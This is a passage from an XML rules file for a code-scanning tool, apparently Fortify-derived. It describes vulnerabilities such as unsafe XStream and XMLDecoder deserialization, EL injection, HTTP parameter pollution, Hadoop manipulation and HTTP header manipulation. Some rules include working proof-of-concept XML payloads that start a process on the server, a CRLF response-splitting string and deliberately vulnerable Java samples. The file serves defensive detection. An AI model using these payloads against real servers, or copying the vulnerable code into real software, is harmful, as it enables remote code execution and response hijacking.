																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 95</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 116</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.3</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[17] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_dynamic_code_evaluation_unsafe_xstream_deserialization
		</key>
		<internalKey>Input Validation and Representation/Dynamic Code
			Evaluation/Unsafe XStream Deserialization
		</internalKey>
		<name>Dynamic Code Evaluation: Unsafe XStream Deserialization</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Deserializing user-controlled XML documents at run-time can allow attackers to execute malicious arbitrary code on the server.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  XStream library provides the developer with an easy way to transmit objects, serializing them to XML documents. But XStream can by default deserialize dynamic proxies allowing an attacker to run arbitrary Java code on the server when the proxy's InvocationHandler is invoked.<br><br><b>Example: </b> The following Java code shows an instance of XStream processing untrusted input.<br><br><pre><br>String body = IOUtils.toString(request.getInputStream(), "UTF-8");<br>Contact expl = (Contact) xstream.fromXML(body);<br></pre><br><br><b>Example:</b> The following XML document will instantiate a ProcessBuilder object and will invoke its static start() method to run the windows calculator.<br><br><pre><br>  &lt;dynamic-proxy&gt;<br>  &lt;interface&gt;com.company.model.Contact&lt;/interface&gt;<br>  &lt;handler class="java.beans.EventHandler"&gt;<br>      &lt;target class="java.lang.ProcessBuilder"&gt;<br>    &lt;command&gt;&lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;&lt;/command&gt;<br>      &lt;/target&gt;<br>      &lt;action&gt;start&lt;/action&gt;<br>  &lt;/handler&gt;<br>  &lt;/dynamic-proxy&gt;<br></pre><br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 95</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 116</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[17] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_dynamic_code_evaluation_xmldecoder_injection
		</key>
		<internalKey>Input Validation and Representation/Dynamic Code
			Evaluation/XMLDecoder Injection
		</internalKey>
		<name>Dynamic Code Evaluation: XMLDecoder Injection</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Deserializing user-controlled XML documents at run-time can allow attackers to execute malicious arbitrary code on the server.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The JDK XMLEncoder and XMLDecoder classes provide the developer with an easy way to persist objects, serializing them to XML documents. But XMLEncoder also allows a developer to serialize method calls and if an attacker can provide the XML document to be deserialized by XMLDecoder, he will be able to execute any arbitrary code on the server.<br><br><b>Example: </b> The following Java code shows an instance of XMLDecoder processing untrusted input.<br><br><pre><br>  XMLDecoder decoder = new XMLDecoder(new InputSource(new InputStreamReader(request.getInputStream(), "UTF-8")));<br><br>  Object object = decoder.readObject();<br>  decoder.close();<br></pre><br><br><b>Example:</b> The following XML document will instantiate a ProcessBuilder object and will invoke its static start() method to run the windows calculator.<br><br><pre><br>  &lt;java&gt;<br>    &lt;object class="java.lang.ProcessBuilder"&gt;<br>      &lt;array class="java.lang.String" length="1" &gt;<br>        &lt;void index="0"&gt;<br>          &lt;string&gt;c:\\windows\\system32\\calc.exe&lt;/string&gt;<br>        &lt;/void&gt;<br>      &lt;/array&gt;<br>      &lt;void method="start"/&gt;<br>    &lt;/object&gt;<br>  &lt;/java&gt;<br></pre><br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 95</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 116</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[13] Oracle <em>Oracle official documentation for XMLDecoder</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[18] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_expression_language_injection
		</key>
		<internalKey>Input Validation and Representation/Expression Language
			Injection
		</internalKey>
		<name>Expression Language Injection</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Failure to validate untrusted user data before assigning it to attribute values of certain Spring MVC JSP tags could allow an attacker to steal sensitive application information as well as bypass HTTPOnly cookie access restrictions.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Expression Language (EL) allows JSP pages to easily access application data stored in user-defined JavaBeans components as well the implicit objects. In addition, JSP pages can also invoke arbitrary public and static methods and perform arithmetic operations using EL expressions. <br>By allowing attackers to inject EL expressions through insufficiently validated user input, an application could grant unauthorized access to sensitive application and server information. Expression Language injection could also allow an attacker to evade HTTPOnly access restrictions imposed on cookies by exploiting access to the implicit <b>cookie</b> object made available in EL expressions.<br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.3</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[15] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[16] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_http_parameter_pollution
		</key>
		<internalKey>Input Validation and Representation/HTTP Parameter
			Pollution
		</internalKey>
		<name>HTTP Parameter Pollution</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Concatenating unvalidated input into a URL can allow an attacker to override the value of a request parameter.  Attacker may be able to override existing parameter values, inject a new parameter or exploit variables out of a direct reach.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  HTTP Parameter Pollution (HPP) attacks consist of injecting encoded query string delimiters into other existing parameters. If a web application does not properly sanitize the user input, a malicious user may compromise the logic of the application to perform either client-side or server-side attacks. By submitting additional parameters to a web application, and if these parameters have the same name as an existing parameter, the web application may react in one of the following ways:<br><br>    It may only take the data from the first parameter<br>    It may take the data from the last parameter<br>    It may take the data from all parameters and concatenate them together<br><br><pre><br>Technology/HTTP back-end                  | Overall Parsing Result                    | Example          |<br>ASP.NET/IIS                               | All occurrences of the specific parameter | par1=val1|val2   |<br>ASP/IIS                                   | All occurrences of the specific parameter | par1=val1|val2   |<br>PHP/Apache                                | Last occurrence                           | par1=val2        |<br>JSP Servlet/Apache Tomcat                 | First occurrence                          | par1=val1        |<br>JSP Servlet/Oracle Application Server 10g | First occurrence                          | par1=val1        |<br>IBM HTTP Server                           | First occurrence                          | par1=val1        |<br>mod_perl/Apache                           | Becomes an array                          | ARRAY(0x8b9059c) |<br></pre><br><br><b>Example 1:</b> Depending on the application server and the logic of the application itself, the following request might cause confusion to the authentication system and allow an attacker to impersonate another user.<br>http://www.server.com/login.php?name=alice&amp;name=hacker<br><br><b>Example 2:</b> The following code uses input from an HTTP request to render two hyperlinks.<br><pre><br>    ...<br>    String lang = request.getParameter("lang");<br>    GetMethod get = new GetMethod("http://www.host.com");<br>    get.setQueryString("lang=" + lang + "&amp;poll_id=" + poll_id);<br>    get.execute();<br>    ...<br></pre><br><br>URL:  http://www.host.com?poll_id=4567<br>Link1:  &lt;a href="http://www.host.com/vote.php?lang=en&amp;poll_id=4567"&gt;English&lt;a&gt;<br>Link2:  &lt;a href="http://www.host.com/vote.php?lang=es&amp;poll_id=4567"&gt;Spanish&lt;a&gt;<br><br>The programmer has not considered the possibility that an attacker could provide a <code>lang</code> such as <code>en&amp;poll_id=1</code>, and then the attacker will be able to change the <code>poll_id</code> at will.<br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 235</em> <br></p>
																									   <p>[6]  <em>HTTP Parameter Pollution</em> Luca Carettoni, Independent Researcher & Stefano Di Paola, MindedSecurity<br></p>
																									   <p>[7]  <em>HTTP Parameter Pollution Vulnerabilities in Web Applications</em> Marco `embyte’ Balduzzi<br></p>
																									   <p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[10] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_hadoop_cluster_manipulation
		</key>
		<internalKey>Input Validation and Representation/Hadoop Cluster
			Manipulation
		</internalKey>
		<name>Hadoop Cluster Manipulation</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The call to <Replace key="PrimaryCall.name"/> on line <Replace key="PrimaryLocation.line"/> allows an attacker to control core components of the Hadoop cluster on which the client application runs.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Hadoop cluster control errors occur when:<br><br>- Data enters a program from an untrusted source.<br><br>- The data is consumed by Hadoop cluster core components such as <code>NameNode</code>, <code>DataNode</code>, <code>JobTraker</code> to change the state of the cluster.<br><br>Hadoop clusters are a hostile environment. When security configurations from protecting unauthorized access to cluster nodes are not set properly, an attack may be able to take control the infrastructure. This leads to the possibility that any data that is provided by the Hadoop cluster to be tampered.<br><br><b>Example 1:</b> The following code shows a <code>Job</code> submission in a typical client application which takes inputs from command line on Hadoop cluster master machine:<br><br><pre><br>  public static void run(String args[]) throws IOException {<br><br>    String path = "/path/to/a/file";<br>    DFSclient client = new DFSClient(arg[1], new Configuration());<br>    ClientProtocol nNode = client.getNameNode();<br><br>    /* This sets the ownership of a file pointed by the path to a user identified<br>     * by command line arguments.<br>     */<br>    nNode.setOwner(path, args[2], args[3]);<br>    ...<br>  }<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[2] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_hadoop_job_manipulation</key>
		<internalKey>Input Validation and Representation/Hadoop Job
			Manipulation
		</internalKey>
		<name>Hadoop Job Manipulation</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The <code>Job</code> submitted to a Hadoop cluster can be tampered in a hostile environment.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Hadoop job manipulation errors occur when:<br><br>- Data enters a program from an untrusted source.<br><br>- The data is used to specify a value of the <code>JobConf</code> that controls a client job.<br><br>Hadoop clusters are a hostile environment. When security configurations from protecting unauthorized access to HDFS on cluster machines are not set properly, an attack may be able to take control. This leads to the possibility that any data that is provided by the Hadoop cluster is tampered.<br><br><b>Example 1:</b> The following code shows a <code>Job</code> submission in a typical client application which takes inputs from command line on Hadoop cluster master machine:<br><br><pre><br>  public void run(String args[]) throws IOException {<br><br>    String inputDir = args[0];<br>    String outputDir = args[1];<br><br>    // Untrusted command line argument<br>    int numOfReducers = Integer.parseInt(args[3]);<br>    Class mapper = getClassByName(args[4]);<br>    Class reducer = getClassByName(args[5]);<br><br>    Configuration defaults = new Configuration();<br>    JobConf job = new JobConf(defaults, OptimizedDataJoinJob.class);<br>    job.setNumMapTasks(1);<br>    // An attacker may set random values that exceed the range of acceptable number of reducers<br>    job.setNumReduceTasks(numOfReducers);<br><br>    return job;<br>  }<br></pre><br><br><b>Example 2:</b> The following code shows a case where an attacker controls the running job to be killed through command line arguments:<br><br><pre><br>  public static void main(String[] args) throws Exception {<br><br>    JobID id = JobID.forName(args[0]);<br>    JobConf conf = new JobConf(WordCount.class);<br>    // configure this JobConf instance<br>    ...<br>    JobClient.runJob(conf);<br>    RunningJob job = JobClient.getJob(id);<br>    job.killJob();<br><br>  }<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[2] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_header_manipulation</key>
		<internalKey>Input Validation and Representation/Header Manipulation
		</internalKey>
		<name>Header Manipulation</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Including unvalidated data in an HTTP response header can enable cache-poisoning, cross-site scripting, cross-user defacement, page hijacking, cookie manipulation or open redirect.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Header Manipulation vulnerabilities occur when:<br><br>1. Data enters a web application through an untrusted source, most frequently an HTTP request.<br><br><IfDef var="ConditionalDescriptions"><br> <br></IfDef><br><br>2. The data is included in an HTTP response header sent to a web user without being validated.<br><br>As with many software security vulnerabilities, Header Manipulation is a means to an end, not an end in itself. At its root, the vulnerability is straightforward: an attacker passes malicious data to a vulnerable application, and the application includes the data in an HTTP response header.<br><br>One of the most common Header Manipulation attacks is HTTP Response Splitting. To mount a successful HTTP Response Splitting exploit, the application must allow input that contains CR (carriage return, also given by %0d or \r) and LF (line feed, also given by %0a or \n)characters into the header. These characters not only give attackers control of the remaining headers and body of the response the application intends to send, but also allows them to create additional responses entirely under their control.<br><br>Many of today's modern application servers will prevent the injection of malicious characters into HTTP headers. For example, recent versions of Apache Tomcat will throw an <code>IllegalArgumentException</code> if you attempt to set a header with prohibited characters. If your application server prevents setting headers with new line characters, then your application is not vulnerable to HTTP Response Splitting. However, solely filtering for new line characters can leave an application vulnerable to Cookie Manipulation or Open Redirects, so care must still be taken when setting HTTP headers with user input.<br><br><b>Example:</b> The following code segment reads the name of the author of a weblog entry, <code>author</code>, from an HTTP request and sets it in a cookie header of an HTTP response.<br><br><pre><br>String author = request.getParameter(AUTHOR_PARAM);<br>...<br>Cookie cookie = new Cookie("author", author);<br>     cookie.setMaxAge(cookieExpiration);<br>     response.addCookie(cookie);<br></pre><br><br>Assuming a string consisting of standard alpha-numeric characters, such as "Jane Smith", is submitted in the request the HTTP response including this cookie might take the following form:<br><br><pre><br>HTTP/1.1 200 OK<br>...<br>Set-Cookie: author=Jane Smith<br>...<br></pre><br><br>However, because the value of the cookie is formed of unvalidated user input the response will only maintain this form if the value submitted for <code>AUTHOR_PARAM</code> does not contain any CR and LF characters. If an attacker submits a malicious string, such as "Wiley Hacker\r\nHTTP/1.1 200 OK\r\n...", then the HTTP response would be split into two responses of the following form:<br><br><pre><br>HTTP/1.1 200 OK<br>...<br>Set-Cookie: author=Wiley Hacker<br><br>HTTP/1.1 200 OK<br>...<br></pre><br><br>Clearly, the second response is completely controlled by the attacker and can be constructed with any header and body content desired. The ability of attacker to construct arbitrary HTTP responses permits a variety of resulting attacks, including: cross-user defacement, web and browser cache poisoning, cross-site scripting and page hijacking.<br><br><b>Cross-User Defacement:</b> An attacker can make a single request to a vulnerable server that will cause the server to create two responses, the second of which may be misinterpreted as a response to a different request, possibly one made by another user sharing the same TCP connection with the server. This can be accomplished by convincing the user to submit the malicious request themselves, or remotely in situations where the attacker and the user share a common TCP connection to the server, such as a shared proxy server. In the best case, an attacker can leverage this ability to convince users that the application has been hacked, causing users to lose confidence in the security of the application. In the worst case, an attacker may provide specially crafted content designed to mimic the behavior of the application but redirect private information, such as account numbers and passwords, back to the attacker.<br><br><b>Cache Poisoning:</b> The impact of a maliciously constructed response can be magnified if it is cached either by a web cache used by multiple users or even the browser cache of a single user. If a response is cached in a shared web cache, such as those commonly found in proxy servers, then all users of that cache will continue receive the malicious content until the cache entry is purged. Similarly, if the response is cached in the browser of an individual user, then that user will continue to receive the malicious content until the cache entry is purged, although only the user of the local browser instance will be affected.<br><br><b>Cross-Site Scripting:</b> Once attackers have control of the responses sent by an application, they have a choice of a variety of malicious content to provide users. Cross-site scripting is common form of attack where malicious JavaScript or other code included in a response is executed in the user's browser. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. The most common and dangerous attack vector against users of a vulnerable application uses JavaScript to transmit session and authentication information back to the attacker who can then take complete control of the victim's account.<br><br><b>Page Hijacking:</b> In addition to using a vulnerable application to send malicious content to a user, the same root vulnerability can also be leveraged to redirect sensitive content generated by the server and intended for the user to the attacker instead. By submitting a request that results in two responses, the intended response from the server and the response generated by the attacker, an attacker can cause an intermediate node, such as a shared proxy server, to misdirect a response generated by the server for the user to the attacker. Because the request made by the attacker generates two responses, the first is interpreted as a response to the attacker's request, while the second remains in limbo. When the user makes a legitimate request through the same TCP connection, the attacker's request is already waiting and is interpreted as a response to the victim's request. The attacker then sends a second request to the server, to which the proxy server responds with the server generated request intended for the victim, thereby compromising any sensitive information in the headers or body of the response intended for the victim.<br><br><b>Cookie Manipulation:</b> When combined with attacks like Cross-Site Request Forgery, attackers can change, add to, or even overwrite a legitimate user's cookies.<br><br><b>Open Redirect:</b> Allowing unvalidated input to control the URL used in a redirect can aid phishing attacks.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 113</em> <br></p>
																									   <p>[11] A. Klein <em>Divide and Conquer: HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics</em> <br></p>
																									   <p>[12] D. Crab <em>HTTP Response Splitting</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>HTTP Response Splitting</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M8 Security Decisions Via Untrusted Inputs</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[19] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_header_manipulation_cookies
		</key>
		<internalKey>Input Validation and Representation/Header
			Manipulation/Cookies
		</internalKey>
		<name>Header Manipulation: Cookies</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Including unvalidated data in Cookies can lead to HTTP Response header manipulation and enable cache-poisoning, cross-site scripting, cross-user defacement, page hijacking, cookie manipulation or open redirect.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Cookie Manipulation vulnerabilities occur when:<br><br>1. Data enters a web application through an untrusted source, most frequently an HTTP request.<br><br><IfDef var="ConditionalDescriptions"><br> <br></IfDef><br>2. The data is included in an HTTP cookie sent to a web user without being validated.<br><br>As with many software security vulnerabilities, cookie manipulation is a means to an end, not an end in itself. At its root, the vulnerability is straightforward: an attacker passes malicious data to a vulnerable application, and the application includes the data in an HTTP cookie.<br><br><b>Cookie Manipulation:</b> When combined with attacks like Cross-Site Request Forgery, attackers can change, add to, or even overwrite a legitimate user's cookies.<br><br>Being an HTTP Response header, Cookie manipulation attacks can also lead to other types of attacks like:<br><br><b>HTTP Response Splitting:</b><br>One of the most common Header Manipulation attacks is HTTP Response Splitting. To mount a successful HTTP Response Splitting exploit, the application must allow input that contains CR (carriage return, also given by %0d or \r) and LF (line feed, also given by %0a or \n)characters into the header. These characters not only give attackers control of the remaining headers and body of the response the application intends to send, but also allows them to create additional responses entirely under their control.<br><br>Many of today's modern application servers will prevent the injection of malicious characters into HTTP headers. For example, recent versions of Apache Tomcat will 